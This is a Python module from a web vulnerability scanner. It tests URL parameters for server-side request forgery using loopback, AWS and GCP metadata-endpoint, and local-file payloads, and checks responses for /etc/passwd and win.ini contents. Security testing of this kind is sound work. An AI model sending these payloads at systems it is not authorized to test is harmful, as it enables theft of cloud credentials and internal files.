"""SSRF (Server-Side Request Forgery) scanner."""

from __future__ import annotations

from msscan.core.http_client import HttpClient
from msscan.core.result import ScanResult
from msscan.scanners.base import BaseScanner
from msscan.utils.helpers import inject_param, extract_params
from msscan.utils.payloads import load_payloads

SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "src", "source",
    "file", "document", "folder", "root", "pg", "style",
    "pdf", "template", "php_path", "doc", "page", "feed",
    "host", "port", "to", "out", "view", "dir", "img",
    "image", "load", "site", "content", "data",
]

SSRF_INDICATORS = [
    "root:x:0:0",           # /etc/passwd
    "[boot loader]",         # win.ini
    "for 16-bit app",        # win.ini
    "localhost",
    "127.0.0.1",
    "internal server",
]


class Scanner(BaseScanner):
    name = "ssrf"

    async def scan(self, url: str, client: HttpClient) -> list[ScanResult]:
        results: list[ScanResult] = []
        payloads = load_payloads("ssrf.txt")
        if not payloads:
            payloads = self._default_payloads()

        params = list(extract_params(url).keys())
        for sp in SSRF_PARAMS:
            if sp not in params:
                params.append(sp)

        for param_name in params:
            for payload in payloads:
                test_url = inject_param(url, param_name, payload)
                try:
                    resp = await client.get(test_url)
                    body = resp.text.lower()

                    for indicator in SSRF_INDICATORS:
                        if indicator in body:
                            results.append(ScanResult(
                                scanner=self.name,
                                severity="CRITICAL",
                                url=test_url,
                                detail=f"SSRF — '{param_name}' parameter accesses internal resources",
                                evidence=f"Indicator: {indicator} | Payload: {payload}",
                            ))
                            break
                    else:
                        continue
                    break  # This parameter is vulnerable, skip remaining payloads
                except Exception:
                    continue

        return results

    @staticmethod
    def _default_payloads() -> list[str]:
        return [
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",           # GCP metadata
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]
